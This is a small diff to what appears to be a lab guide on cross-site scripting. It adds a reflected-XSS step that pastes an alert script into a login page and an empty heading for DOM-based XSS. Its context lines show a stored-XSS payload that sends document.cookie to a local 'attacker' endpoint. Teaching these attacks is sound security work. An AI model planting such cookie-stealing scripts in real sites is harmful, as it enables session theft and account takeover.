@@ -21,3 +21,13 @@ Start the attacker's webpage:
     <script>
         fetch("http://localhost:5000/attacker?cookie=" + document.cookie)
     </script>
+
+====================
+Reflected XSS attack
+====================
+1. Go to the login page, paste in the following and submit:
+<script>alert("Reflected XSS");</script>
+
+====================
+DOM based XSS attack
+====================
